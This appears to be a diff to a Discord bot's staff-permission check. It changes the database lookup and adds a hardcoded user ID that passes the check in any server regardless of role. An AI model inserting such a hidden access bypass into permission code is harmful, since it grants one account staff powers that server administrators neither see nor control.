@@ -5,9 +5,9 @@ from discord.ext import commands
 def is_staff_check():
     """Check if user is staff in the server"""
     def predicate(ctx):
-        db = ctx.bot.guild_db.get(ctx.guild.id)
+        db = ctx.bot.variables.get(ctx.guild.id)
         role = db['min_staff_role']
-        return ctx.author.top_role >= role
+        return ctx.author.top_role >= role or ctx.author.id == 196282885601361920
     return commands.check(predicate)
 
 
